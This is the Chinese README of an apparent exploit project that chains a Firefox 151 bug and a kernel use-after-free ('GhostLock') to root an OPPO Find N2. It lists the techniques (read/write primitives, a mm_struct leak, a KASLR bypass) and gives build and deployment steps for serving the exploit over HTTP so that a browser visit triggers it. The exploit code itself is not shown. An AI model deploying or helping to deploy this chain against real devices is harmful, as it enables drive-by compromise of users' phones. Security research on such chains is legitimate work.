# GhostLock OPPO Find N2 Exploit

> 基于 CVE-2026-43499 (GhostLock) 和 CVE-2026-10702 (Firefox) 的 Android 内核提权漏洞利用链

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Kernel: 5.10.236](https://img.shields.io/badge/Kernel-5.10.236-green.svg)]()
[![Device: OPPO Find N2](https://img.shields.io/badge/Device-OPPO%20Find%20N2-orange.svg)]()

## 项目概述

本项目是针对 **OPPO Find N2 (SM8475/CPH2413)** 设备的内核漏洞利用链，结合两个 CVE 漏洞实现从浏览器到内核的完整提权：

- **CVE-2026-10702**: Firefox 151 浏览器漏洞，获取用户态代码执行
- **CVE-2026-43499 (GhostLock)**: Linux 内核 rtmutex 栈 UAF 漏洞，实现内核提权

### 当前项目状态

| 阶段 | 状态 | 说明 |
|------|------|------|
| Firefox exploit | ✅ 完成 | CVE-2026-10702 在 Firefox 151 上工作正常 |
| KernelSnitch mm_struct leak | ✅ 完成 | 已修复偏移问题，成功泄漏 mm_struct |
| GhostLock FUTEX 触发 | ⚠️ 受限 | Firefox seccomp 沙箱阻止 FUTEX PI 操作 |
| 内核提权 | ❌ 待解决 | 需要替代技术绕过 seccomp 限制 |

> [!NOTE]
> 本项目基于 [CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) 开源研究项目，针对 OPPO Find N2 设备进行了适配和偏移修复。

## 核心特性

- **Firefox 漏洞利用**：通过 CVE-2026-10702 在 Firefox 151 中获取任意读写原语 (AAW/AAR/RW64)
- **KernelSnitch mm_struct 泄漏**：使用时序侧信道技术泄漏内核 mm_struct 地址，已修复偏移问题
- **Slide/pselect KASLR 绕过**：通过 pselect 时序泄漏内核基地址
- **GhostLock 内核漏洞触发**：利用 rtmutex 栈 UAF 创建悬空指针
- **精确偏移提取**：使用 pahole 从编译的 vmlinux 提取所有结构体偏移
- **实时日志监控**：通过 HTTP 日志服务器实时查看 exploit 执行状态

## 技术栈

### 运行环境
- **目标设备**: OPPO Find N2 (SM8475/CPH2413)
- **内核版本**: Linux 5.10.236-android12-9
- **浏览器**: Firefox 151.0 (Fenix)
- **Android**: 16 (BP2A.250605.015)

### 开发工具链
- **编译器**: Android NDK r29 (clang-21)
- **交叉编译**: aarch64-linux-android35
- **内核编译**: gcc-11 + aarch64-linux-gnu-gcc
- **偏移提取**: pahole (dwarves)
- **脚本语言**: Python 3 (服务器)

### 依赖库
- **CyberMeowfia**: NebuSec 开源 exploit 研究项目
- **KernelSnitch**: 内核 mm_struct 泄漏库
- **pyelftools**: Python ELF 解析库 (用于偏移验证)

## 快速开始

### 环境要求

**macOS 开发机:**
- macOS 12+
- Android NDK r29
- Python 3
- adb (Android Debug Bridge)

**Linux 编译服务器 (可选):**
- Ubuntu 20.04+
- gcc-11, aarch64-linux-gnu-gcc
- pahole (dwarves)

**目标设备:**
- OPPO Find N2 (CPH2413/PGU110)
- Firefox 151.0
- USB 调试已开启

### 安装部署

```bash
# 1. 克隆仓库
git clone https://github.com/your-username/oppo-ghostlock.git
cd oppo-ghostlock

# 2. 安装 Android NDK (macOS)
brew install --cask android-ndk

# 3. 编译 exploit (使用 NDK)
NDK=~/Library/Android/android-ndk-r29
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang \
  --target=aarch64-linux-android35 \
  --sysroot=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/sysroot \
  -I. -O2 -fPIC -shared \
  -DTARGET_CONFIG_H="exploit/targets/oppo-find_n2/target.h" \
  exploit/src/main.c exploit/src/util.c exploit/src/slide.c \
  exploit/src/fops.c exploit/src/pipe.c exploit/src/root.c \
  exploit/src/preload.c exploit/src/su_blob.S exploit/src/wallpaper_blob.S \
  -pthread -o preload.so

# 4. 启动 exploit 服务器
cd exploit-server
python3 -m http.server 8080 &
python3 log_server.py &

# 5. 在手机上测试
adb push preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"
```

### 验证成功

1. 手机打开 Firefox 151
2. 访问 `http://<开发机IP>:8080/CVE-2026-10702/`
3. 确认设备指纹后 exploit 自动执行
4. 查看 `http://<开发机IP>:8081` 实时日志

## 仓库目录结构

```
oppo-ghostlock/
├── README.md                          # 项目说明文档
├── TROUBLESHOOTING.md                 # 问题排查手册
├── FAQ.md                             # 常见问题
├── CONTRIBUTING.md                    # 贡献指南
├── CHANGELOG.md                       # 版本更新日志
├── docs/
│   ├── architecture.md                # 架构设计文档
│   ├── setup.md                       # 环境搭建与部署
│   ├── best-practice.md               # 开发最佳实践
│   └── knowledge-notes.md             # 技术知识沉淀
├── .github/
│   └── ISSUE_TEMPLATE/
│       ├── bug_report.md              # 缺陷反馈模板
│       └── feature_request.md         # 功能建议模板
├── exploit/
│   ├── targets/
│   │   └── oppo-find_n2/
│   │       └── target.h               # 内核偏移配置 (pahole 验证)
│   └── src/
│       ├── main.c                     # 主入口
│       ├── util.c                     # KernelSnitch 设置与工具函数
│       ├── slide.c                    # Slide/pselect KASLR 绕过
│       ├── fops.c                     # file_operations 利用
│       ├── pipe.c                     # pipe 物理读写
│       ├── root.c                     # root 提权
│       ├── preload.c                  # LD_PRELOAD 入口
│       ├── common.h                   # 公共定义与偏移
│       ├── offset.h                   # 偏移头文件
│       ├── su_blob.S                  # su daemon 二进制
│       ├── wallpaper_blob.S           # wallpaper 二进制
│       └── kernelsnitch/
│           ├── kernelsnitch.h         # KernelSnitch 核心
│           ├── utils.h                # 工具函数
│           ├── futex_hash.h           # futex 哈希
│           └── timeutils.h            # 时序工具
├── exploit-server/
│   ├── CVE-2026-10702/
│   │   ├── index.html                 # exploit 入口页面
│   │   ├── exploit.html               # Firefox exploit 主逻辑
│   │   ├── ansi.js                    # ANSI 渲染器
│   │   └── <hex-encoded-filename>     # preload.so (按设备指纹命名)
│   ├── log_server.py                  # 实时日志服务器
│   └── boot-2.img                     # 原始 boot.img (用于偏移提取)
├── kernel_extracted/                  # 内核源文件参考
├── extract-vmlinux                    # vmlinux 提取工具
├── CyberMeowfia-main/                # CyberMeowfia 原始代码
└── commands.txt                       # 快速命令参考
```

## 文档导航

| 文档 | 说明 |
|------|------|
| [架构设计](docs/architecture.md) | 整体架构、模块详解、技术选型 |
| [环境搭建](docs/setup.md) | 开发环境、部署步骤、配置项 |
| [最佳实践](docs/best-practice.md) | 代码规范、优化记录、安全规范 |
| [知识沉淀](docs/knowledge-notes.md) | 技术笔记、方案对比、代码片段 |
| [问题排查](TROUBLESHOOTING.md) | 常见问题诊断与解决方案 |
| [常见问题](FAQ.md) | 快速问答 |
| [版本日志](CHANGELOG.md) | 迭代记录 |
| [贡献指南](CONTRIBUTING.md) | 如何参与贡献 |

## 开源协议

本项目采用 [GPL-3.0](LICENSE) 开源协议。

> [!WARNING]
> 本项目仅供安全研究和教育目的。未经授权对他人设备进行测试是违法的。

## 致谢

- [NebuSec CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) - 原始 exploit 研究项目
- [GhostLock CVE-2026-43499](https://nebusec.ai/research/ionstack-part-2/) - 内核漏洞发现与分析
- [IonStack Part I](https://nebusec.ai/research/ionstack-part-1/) - Firefox 漏洞发现
- Android Open Source Project (AOSP)
- Linux Kernel Community
